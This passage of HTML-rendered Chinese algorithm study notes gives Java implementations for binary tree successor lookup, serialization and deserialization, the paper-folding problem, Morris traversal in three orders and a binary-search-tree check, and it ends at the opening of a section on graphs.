punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token keyword">return</span> cur<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Node</span> par <span class="token operator">=</span> node<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>    cur <span class="token operator">=</span> node<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>par <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> par<span class="token punctuation">.</span>left <span class="token operator">!=</span> cur<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cur <span class="token operator">=</span> par<span class="token punctuation">;</span>        par <span class="token operator">=</span> par<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> par<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二叉树序列化"><a href="#二叉树序列化" class="headerlink" title="二叉树序列化"></a>二叉树序列化</h3><p>序列化为一个字符串，先序中序后序按层都可以，道理一样，以下划线分割，null则记为”#”</p><p>这里采用先序遍历</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">serial</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">"#_"</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> left <span class="token operator">=</span> <span class="token function">serial</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> right <span class="token operator">=</span> <span class="token function">serial</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> head<span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">+</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化的思路就是先将该字符串按下划线分开，全部放到队列中，然后按照出队顺序构建整棵树</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">unserial</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nodes <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> que <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> each<span class="token operator">:</span>nodes<span class="token punctuation">)</span> que<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>que<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> q<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> cur <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> head <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> head<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="折纸问题"><a href="#折纸问题" class="headerlink" title="折纸问题"></a>折纸问题</h3><blockquote><p> 一段长纸条，从下边向上方对折1次，压出折痕后展开。此时折痕是凹下去的，即折痕突起的方向指向纸条的背面。如果从纸条的下边向上方连续对折2次，压出折痕后展开，此时有三条折痕，从 上到下依次是下折痕、下折痕和上折痕。</p><p>给定一个输入参数N，代表纸条都从下边向上方连续对折N次。 请从上到下打印所有折痕的方向。 例如:N=1时，打印: down N=2时，打印: down down up</p></blockquote><p>对折纸条的过程中，从第一条折痕开始，折第二次时，第一条折痕上侧出现down，下侧出现up，折第三次时，第二条位于上侧的折痕上侧出现down，下侧出现up，第二条位于下侧的折痕同理，形成一个规律，这个规律构建了一棵假想的二叉树，对该树进行中序遍历即为答案</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm2_f2.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">paperFold</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">process</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// down - true 凹 false 凸</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> level<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">boolean</span> down<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>level <span class="token operator">></span> n<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>level <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>down <span class="token operator">?</span> <span class="token string">"down "</span> <span class="token operator">:</span> <span class="token string">"up "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>level <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Morris遍历"><a href="#Morris遍历" class="headerlink" title="Morris遍历"></a>Morris遍历</h3><p>一种遍历二叉树的方式，并且时间复杂度O(N)，额外空间复杂度O(1) </p><p>通过利用原树中大量空闲指针的方式，达到节省空间的目的</p><p>Morris遍历细节 </p><p>假设来到当前节点cur，开始时cur来到头节点位置 </p><p>1）如果cur没有左孩子，cur向右移动(cur = cur.right) </p><p>2）如果cur有左孩子，找到左子树上最右的节点mostRight： </p><ul><li><p>如果mostRight的右指针指向空，让其指向cur， 然后cur向左移动(cur = cur.left) </p></li><li><p>如果mostRight的右指针指向cur，让其指向null， 然后cur向右移动(cur = cur.right) </p></li></ul><p>3）cur为空时遍历停止</p><blockquote><p>有左子树的节点可以回到该节点两次，没有左子树的节点只能到达1次</p><p>有左子树的节点可以根据左子树的最右节点的指向来判断第几次到达该节点，指向自己就是第二次</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">morris</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> mostRight<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span> <span class="token comment">// 只是先初始化为左子树的根节点</span>        <span class="token comment">// 是否有左孩子</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 找到最右节点</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> cur<span class="token punctuation">)</span> mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 说明第一次来到cur节点，就让现在的最右节点的右指针指向cur</span>                mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="先序遍历-1"><a href="#先序遍历-1" class="headerlink" title="先序遍历"></a>先序遍历</h4><p>对于先序来说，对于</p><p>1）只到达一次的节点，就直接打印</p><p>2）会到达两次的节点，只打印第一次</p><blockquote><p>只需要在<code>到达一次的节点</code>和<code>到达两次的节点第一次到达</code>时添加打印代码即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">morrisPre</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> mostRight<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span> <span class="token comment">// 只是先初始化为左子树的根节点</span>        <span class="token comment">// 是否有左孩子</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 找到最右节点</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> cur<span class="token punctuation">)</span> mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 说明第一次来到cur节点，就让现在的最右节点的右指针指向cur</span>                <span class="token comment">// 第一次到达就打印</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 没有左子树的节点只到达一次</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="中序遍历-1"><a href="#中序遍历-1" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>对于中序来说，对于</p><p>1）只到达一次的节点，就直接打印</p><p>2）会到达两次的节点，只打印第二次</p><blockquote><p><code>到达一次的节点</code>和<code>到达两次的节点第二次到达</code>的地方在判断是否有左孩子外面相遇，添加一处打印语句即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">morrisIn</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> mostRight<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span> <span class="token comment">// 只是先初始化为左子树的根节点</span>        <span class="token comment">// 是否有左孩子</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 找到最右节点</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> cur<span class="token punctuation">)</span> mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 说明第一次来到cur节点，就让现在的最右节点的右指针指向cur</span>                mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 第二次到达（上面的最近的else跳出来之后就到这里） 和 没有左子树的节点只到达一次 都归结在这里</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="后序遍历-1"><a href="#后序遍历-1" class="headerlink" title="后序遍历"></a>后序遍历</h4><p>对于后序来说，</p><p>当第二次到达节点时，逆序打印该节点左子树的右边界（不含该节点），morris遍历完成之后，再逆序打印整棵树的右边界</p><p>如何逆序打印一棵树的右边界？修改右边界的右指针全都指向父，根节点指向空，打印之后再改回来</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span> par <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token class-name">Node</span> temp<span class="token punctuation">;</span>    par<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        temp <span class="token operator">=</span> par<span class="token punctuation">;</span>        par <span class="token operator">=</span> cur<span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        par<span class="token punctuation">.</span>right <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> par<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printEdge</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span> tail <span class="token operator">=</span> <span class="token function">reverse</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> cur <span class="token operator">=</span> tail<span class="token punctuation">;</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>tail<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">morrisPos</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> mostRight<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span> <span class="token comment">// 只是先初始化为左子树的根节点</span>        <span class="token comment">// 是否有左孩子</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 找到最右节点</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> cur<span class="token punctuation">)</span> mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 说明第一次来到cur节点，就让现在的最右节点的右指针指向cur</span>                mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                    mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token comment">// 第二次到达，逆序打印该节点左子树的右边界</span>                <span class="token comment">// 注意在将最右节点调成null之后才能打印</span>                <span class="token function">printEdge</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printEdge</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判断搜索二叉树-1"><a href="#判断搜索二叉树-1" class="headerlink" title="判断搜索二叉树"></a>判断搜索二叉树</h4><p>改写中序遍历即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isBST</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token class-name">Node</span> mostRight<span class="token punctuation">;</span>        <span class="token keyword">int</span> preValue <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span> <span class="token comment">// 只是先初始化为左子树的根节点</span>            <span class="token comment">// 是否有左孩子</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token comment">// 找到最右节点</span>                <span class="token keyword">while</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> cur<span class="token punctuation">)</span> mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 说明第一次来到cur节点，就让现在的最右节点的右指针指向cur</span>                    mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>                    cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token comment">//            // 第二次到达（上面的最近的else跳出来之后就到这里） 和 没有左子树的节点只到达一次 都归结在这里</span><span class="token comment">//            System.out.println(cur.value);</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value <span class="token operator">&lt;=</span> preValue<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            preValue <span class="token operator">=</span> cur<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>使用树形DP：方法必须做第三次信息的强整合（一个节点必须要完左子树的信息，要完右子树的信息，然后回到该节点，做整合），必须用树形DP</p><p>使用Morris遍历：不需要强整合，可以用树形DP，但是Morris遍历是最优解（因为Morris遍历不能第三次回到某个节点）</p><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="模板"><a href="#模板" class="headerlink" 